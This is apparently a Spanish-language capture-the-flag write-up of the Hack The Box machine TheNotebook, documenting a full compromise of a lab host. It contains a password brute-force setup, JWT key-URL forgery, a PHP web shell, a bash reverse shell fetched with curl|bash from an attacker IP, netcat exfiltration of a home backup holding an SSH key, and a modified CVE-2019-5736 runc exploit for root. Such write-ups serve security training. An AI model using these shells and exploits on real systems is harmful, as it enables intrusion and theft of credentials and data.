---
layout: post
title: HTB_TheNotebook
date: 2023/07/10
slug: HTB_TheNotebook
heroImage: /assets/machines.jpg
---

# TheNotebook {-}

## Introduccion {-}

La maquina del dia 31/07/2021 se llama TheNotebook
.

El replay del live se puede ver aqui

[![S4vitaar TheNotebook maquina](https://img.youtube.com/vi/tEyTJYDbN3s/0.jpg)](https://www.youtube.com/watch?v=tEyTJYDbN3s)

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.230
```
ttl: 63 -> maquina linux.
Recuerda que en cuanto a ttl respecta 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.230 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.230 -oN targeted
```

| Puerto | Servicio  | Que se nos occure?                        | Que falta?           |
| ------ | --------- | ----------------------------------------- | -------------------- |
| 22     | ssh       | conexion directa                        | usuario y contraseña |
| 80     | http      | Analizis de la web y Fuzzing              |                      |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.230
```

Nada muy interesante

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.230 -oN webScan
```

Ya nos detecta un 
```bash
 /phpmyadmin/ 
```
 y ficheros de wordpress

#### Chequear la web por puerto 80 {-}

Con firefox navigamos en la web para ver lo que es.

- wappalizer nos dice que hay nginx ubuntu bootstrap
- hay un register y un login pero no vemos extensiones php
- Si pinchamos el login intentamos ponerle un admin admin y nos dice que la contraseña es incorrecta -> usuario admin existe
- Si ponemos administrator admin nos dice que el usuario es incorrecto

Vemos que hay formas de enumeracion con este login



#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.37/WFUZZ
```

Encontramos un ruta plugins que no suele ser normal porque en wordpress los plugins suelen estar en 
```bash
 /wp-content/plugins 
```
 y no
en 
```bash
 /plugins 
```
 directamente

Aqui encontramos dos ficheros 
```bash
 .jar 
```
. Los descargamos en nuestra maquina de atacante.




## Evaluacion de vulnerabilidades {-}

### Ataque de tipo intruder con BurpSuite {-}

1. Creamos un diccionario basado en el rockyou.txt

    ```bash
    cd content
    head -n 10000 /usr/share/wordlists/rockyou.txt > passwords
    ```

1. Desde burpsuite configuramos el scope hacia la url http://10.10.10.230
1. En firefox le ponemos el foxyproxy para el burpsuite
1. Lanzamos una peticion desde login con admin admin y la interceptamos con el burpsuite
1. En burpsuite le damos al 
```bash
 Ctrl+i 
```
 para enviarlo al intruder
1. Configuramos el attacker **Sniper** dando la posicion a la palabra password


![otebook-sier-cofi](/assets/images/notebook-sniper-config.png) 
1. Cargamos el diccionario creado a la payload list y le quitamos el Payload encoding

    ```{r, echo = FALSE, fig.cap="notebook sniper payload list", out.width="90%"}
    knitr::include_graphics("images/notebook-sniper-list.png")

![otebook-sier-list](/assets/images/notebook-sniper-list.png) 
    - en Grep - Extract damos a ADD
    - le damos a Fetch response

        ```{r, echo = FALSE, fig.cap="notebook sniper fetch response", out.width="90%"}
        knitr::include_graphics("images/notebook-fetch-response.png")
        ```


![otebook-fetch-resose](/assets/images/notebook-fetch-response.png) 
### Register un nuevo usuario {-}

Como no a sido posible reventar la mamona con un password brute force, utilizamos la web para ver si encontramos una vulnerabilidad.
Nos creamos un usuario y vemos que podemos añadir notas como un blog. Una de las possibilidades seria tratar de hacer fuzzing pero en este 
caso necesitariamos la cookie de session.Analizando un poco vemos que la cookie de session esta almazenada por un JWT.

Antes de tratar de fuzzear, mirramos si se puede tratar de reventar el JWT Token.

Copiamos el token y la auditamos en [jwt.io](https://jwt.io)

Vemos que hay una data que se llama *admin_cap* y que esta setteada a 0. Pero si tratamos de cambiar a 1 nos invalida el token y vemos que es porque
necesitamos un key (private o public) que parece que sea en el 
```bash
 http://localhost:7070/privKey.key 
```
 de la maquina victima. Posiblemente podriamos Hijackear
la url donde encuentra esta Key por una creado por nosotros.

### JWT Hijacking {-}

1. Nos creamos un par de claves con **openssl**

    ```bash
    openssl genrsa -out privKey.key 2048
    ```
1. Introducimos la key en la web de JWT.io

    ```{r, echo = FALSE, fig.cap="jwt hijacking", out.width="90%"}
    knitr::include_graphics("images/jwt-hijacking.png")
    ```

1. Nos entablamos un servidor web para que pueda cojer la key


![jwt-hijacki](/assets/images/jwt-hijacking.png) 
1. Copiamos el JWT token en firefox

    ```{r, echo = FALSE, fig.cap="jwt firefox hijack", out.width="90%"}
    knitr::include_graphics("images/jwt-firefox.png")
    ```

Ya lanzando la web otra vez y vemos que un Admin Panel a salido y en el cual se puede ver notas y uploadear ficheros.

### Analizamos las notas {-}

- Usuario Noah
![jwt-firefox](/assets/images/jwt-firefox.png) 
- Ejecucion de fichero php

### Uploadeamos un s4vishell.php {-}

Como hay un boton upload vamos a por una 
```bash
 s4vishell.php 
```


```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Subimos el fichero y perfecto nos va y pinchando el boton view ya tenemos Remote Code Execution

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Crear una reverse shell desde la s4vishell.php con un index.html {-}

1. Creamos un index.html

    ```bash
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.8/443 0>&1
    ```

1. Compartimos un servicio http por el puerto 80

    ```bash
    python3 -m http.server 80
    ```

1. Desde la s4vishell

    ```php
    http://10.10.10.230/6a5sd4f6a5sd1f6as5dfa6sd51fa.php?cmd=curl 10.10.14.8|bash
    ```

Ya esta

```bash
whoami
#Output

www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Investigamos la maquina {-}

```bash
ls -l
cd /home
ls -l
cd noah/
cat user.txt
```

Permission denied. Nos tenemos que pasar al usuario Noah

### User Pivoting al usuario noah {-}

#### Analizamos el systema {-}

```bash
id
sudo -l
cd /
find \-perm -4000 2>/dev/null
cat /etc/crontab
ls -l /var/spool/cron
```

No vemos nada. Tendremos que pasar por el sistema web

```bash
cd /var
find \-type f 2>/dev/null
find \-type f 2>/dev/null | grep "config"
find \-type f 2>/dev/null | grep "config" | xargs grep "password" 2>/dev/null
find \-type f 2>/dev/null | grep "config" | xargs grep -E "username|password|key|database" 2>/dev/null
find \-type f 2>/dev/null | grep "config" | xargs grep -E "username|password|key|database" 2>/dev/null | grep -v "debconf"
find \-type f 2>/dev/null | grep "config" | xargs grep -E "username|password|key|database" 2>/dev/null | grep -v -E "debconf|keyboard"
```

Tampoco vemos algo aqui.

```bash
cd /var
find \-type f 2>/dev/null | grep -v -E "lib|cache"
```

Aqui vemos algo que podria ser interesante.

```bash
cd /var/backups
ls -l
```

Vemos un 
```bash
 home.tar.gz 
```
 y tenemos derecho de visualizar

#### Nos enviamos el home.tar.gz {-}

1. En la maquina de atacante

    ```bash
    nc -nlvp 443 > home.tar.gz
    ```

1. En la maquina victima

    ```bash
    nc 10.10.14.8 443 < home.tar.gz
    ```

1. Hacemos un md5sum para ver la integridad de la data
1. Analizamos el fichero

    ```bash
    7z l home.tar.gz
    ```

Ya podemos ver que es un comprimido del directorio home del usuario Noah con authorized_key y una id_rsa del proprio usuario

### Conexion por ssh {-}

```bash
chmod 600 id_rsa
ssh -i id_rsa noah@10.10.10.230
```

Ya estamos a dentro y podemos ver la flag

## Escalada de Privilegios {-}

### Rootear la maquina {-}

```bash
id
sudo -l
#Output

(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Investigamos el container webapp-dev01 con docker pero no encontramos nada

```bash
docker --version
#Output

Docker version 18.06.0-ce
``` 

Miramos si existe un exploit en la web 
```bash
 docker 18.06.0-ce exploit github 
```
 y encontramos algo en [CVE-2019-5736-POC](https://github.com/Frichetten/CVE-2019-5736-PoC)

```bash
cd exploits
git clone https://github.com/Frichetten/CVE-2019-5736-PoC
cd CVE-2019-5736-PoC

vi main.go
```

Aqui mirando el 
```bash
 main.go 
```
 vemos un comentario que dice:


```bash
 // This is the line of shell commands that will execute on host 
```


La modificamos para autorgar un derecho SUID a la bash

```bash
var payload = "#!/bin/bash \n chmod 4755 /bin/bash
```

Ahora lo compilamos y lo transferimos a la maquina victima

1. En la maquina de attackante buildeamos el exploit y preparamos el envio

    ```bash
    go build -ldflags "-s -w" main.go
    ls
    upx main
    mv main exploit
    python -m http.server 80
    ```

1. En la maquina victima nos conectamos al contenedor

    ```bash
    sudo /usr/bin/docker exec -it webapp-dev01 bash
    cd /tmp
    wget http://10.10.14.8/exploit
    ls
    chmod +x exploit
    ./exploit
    ```

1. No conectamos nuevamente con ssh

    ```bash
    ssh -i id_rsa noah@10.10.10.230
    sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
    ls -l /bin/bash
    bash -p
    whoami

    root
    ```

Ya estamos root y podemos leer la flag
